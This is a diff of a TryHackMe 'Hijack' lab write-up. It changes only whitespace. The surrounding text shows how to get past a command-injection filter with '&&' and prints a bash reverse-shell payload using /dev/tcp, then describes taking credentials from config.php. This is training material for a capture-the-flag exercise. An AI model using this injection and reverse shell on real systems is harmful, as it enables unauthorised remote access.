@@ -76,7 +76,8 @@ Link: [Hijack](https://tryhackme.com/r/room/hijack)
 - While here, you can try to inject a command that gives you a reverse shell. I tried using a semi-colon after inputting ftp but the system detected this as a command injection. The other option is to use `&&` where the second commnad is executed only after the first is completed. With this, you can perform command injection as such to get a reverse shell;
 
 `ftp && bash -c "bash -i >& /dev/tcp/ip/port 0>&1"`
-  where ip is your listening IP and port is your netcat listening port and executing this gives you a shell.
+ 
+   where ip is your listening IP and port is your netcat listening port and executing this gives you a shell.
 
 - Viewing the contents of `config.php` reveals credentials for the user rick which you can ssh into.
 - Now, you can get your first flag.
